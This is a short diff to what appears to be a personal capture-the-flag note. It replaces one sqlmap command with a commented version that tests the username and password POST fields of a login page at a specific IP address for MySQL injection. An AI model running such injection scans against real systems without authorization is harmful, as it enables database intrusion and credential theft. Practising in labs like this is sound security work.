@@ -1,1 +1,4 @@
-sqlmap -u "http://35.227.24.107/a0218d304a/login?username=&password=" --method=POST --batch
+# SQLmap
+# 
+# check username and password for sql injection using POST method for DBMS of type MySQL.
+sqlmap -u "http://35.227.24.107/a0218d304a/login" --method=POST --batch  --dbms=mysql --data ="username=aaa&password=bbbb&form=submit"
